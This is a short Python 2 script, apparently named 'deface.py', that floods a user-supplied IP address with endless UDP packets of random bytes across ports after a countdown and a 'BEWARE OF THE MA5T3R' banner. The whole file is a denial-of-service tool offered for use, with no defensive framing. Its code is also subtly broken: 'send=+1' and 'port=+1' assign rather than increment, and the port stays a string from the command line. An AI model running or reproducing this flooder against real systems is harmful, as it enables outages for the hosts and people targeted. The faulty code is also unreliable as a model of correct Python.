import socket
import os
import random
import sys
import time
from datetime import datetime
now=datetime.now()
hour=now.hour
minute=now.minute
month=now.month
year=now.year
def attack(ip,port):
    os.system("clear")
    print("The attack started on ",now,month,year," at ",hour," : ",minute)
    os.system("clear")
    print("Lets Begin")
    os.system("clear")
    print("3")
    os.system("clear")
    os.system("sleep 1s")
    print("2")
    os.system("clear")
    os.system("sleep 1s")
    print("1")
    os.system("clear")
    os.system("figlet BEWARE OF THE MA5T3R")
    os.system("sleep 1s")
    print("Lets GO!!")
    sock=socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    byte=random._urandom(1490)
    sent=0
    while (True):
        sock.sendto(byte, (ip,port))
        send=+1
        port=+1
        print "Sent bytes: ",byte," to ip address: ",ip," to the port: ",port
        if port == 65534:
            port=1

if (len(sys.argv)==3):
    ip=sys.argv[1]
    port=sys.argv[2]
    attack(ip,port)
else:
    print """Wrong usage: 
             please use it this way:
             python deface.py ip_address port"""
